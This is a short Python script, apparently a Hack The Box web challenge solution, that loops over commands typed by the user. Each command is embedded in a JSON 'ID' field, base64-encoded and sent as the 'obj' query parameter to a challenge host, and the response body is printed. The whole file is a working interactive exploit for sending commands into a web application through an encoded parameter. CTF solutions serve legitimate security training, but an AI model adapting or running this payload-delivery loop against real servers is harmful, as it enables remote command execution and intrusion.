
import requests
import base64
import re
from bs4 import BeautifulSoup
import sys
if len(sys.argv)<2:
 print("Syntax:python %s <port>")%(sys.argv[0])
else:
 print('-'*55)
 print("HTB WEB-CHALLENGE coded by ZyperX [Ez-Pz]")
 print('-'*55)
 while True:
  cmd=raw_input("[*]Enter cmd : ")
  payload=('{"ID":\"%s\"}')%(cmd)
  print("[*]Payload : %s")%(payload)
  print("[*]Base64 encoding..")
  payload=base64.b64encode(payload)
  print("[*]Encoded Payload : %s")%(payload)
  r=requests.session()
  port=str(sys.argv[1])
  url="http://docker.hackthebox.eu:"
  port=port+"/?obj="
  url=url+port
  url=url+payload
  print("[*]Sending GET request to : %s")%(url)
  op=r.get(url)
  soup=BeautifulSoup(op.text,'html.parser')
  soup=soup.find('body').text.strip()
  print("[*]Response : %s")%(soup)
  print("-"*80)
